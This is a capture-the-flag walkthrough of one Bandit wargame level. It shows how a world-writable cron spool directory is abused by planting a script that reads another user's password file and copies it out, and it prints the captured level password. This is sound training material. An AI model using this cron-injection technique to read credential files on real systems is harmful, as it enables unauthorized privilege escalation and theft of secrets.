
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

```
bandit22@melinda:~$ cd /etc/cron.d/
bandit23@melinda:/etc/cron.d$ ls -a
.                  cronjob_bandit24       natas25_cleanup   semtex0-ppc
..                 cronjob_bandit24_root  natas25_cleanup~  semtex5
.placeholder       leviathan5_cleanup     natas26_cleanup   sysstat
behemoth4_cleanup  manpage3_resetpw_job   natas27_cleanup   vortex0
cron-apt           melinda-stats          php5              vortex20
cronjob_bandit22   natas-session-toucher  semtex0-32
cronjob_bandit23   natas-stats            semtex0-64
bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
```

Opening the **cronjob_bandit24.sh** script we get the following Bash Script, seen below:

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 "./$i"
	rm -f "./$i"
    fi
done
```

We will go ahead and create a temporary directory.

```
bandit23@melinda:/etc/cron.d$ mkdir /tmp/jhalon
bandit23@melinda:/etc/cron.d$ cd /tmp/jhalon
bandit23@melinda:/tmp/jhalon$ nano
```

Once you open **Nano** we will go ahead and write our own script to inject.

```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > tmp/jhalon/pass
```

Save this new script as `script.sh`. And go back into our console…

```
bandit23@melinda:/tmp/jhalon$ chmod 777 script.sh
bandit23@melinda:/tmp/jhalon$ cp script.sh /var/spool/bandit24
bandit23@melinda:/tmp/jhalon$ dir -a
.  ..  pass  script.sh
bandit23@melinda:/tmp/jhalon$ cat /tmp/jhalon/pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
